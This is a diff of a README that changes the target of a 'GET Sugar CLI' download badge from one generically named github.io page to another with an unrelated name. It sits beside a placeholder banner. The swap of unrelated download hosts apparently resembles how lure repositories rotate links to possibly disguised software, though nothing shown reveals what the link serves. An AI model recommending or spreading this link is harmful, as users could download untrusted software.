@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=35b9d097ce4aeaccbe18c2da8d7b5a6d4d665c14-9042801-images-thumbs&n=13)
 
-[![GET Sugar CLI](https://img.shields.io/badge/GET%20%E2%80%94%20Sugar%20CLI-0078D6?style=for-the-badge&logoColor=white)](https://backup-and-restore-toolkit.github.io/.github/sugar-cli)
+[![GET Sugar CLI](https://img.shields.io/badge/GET%20%E2%80%94%20Sugar%20CLI-0078D6?style=for-the-badge&logoColor=white)](https://virtual-machine-monitor-suite.github.io/.github/sugar-cli)
 
 ---
 
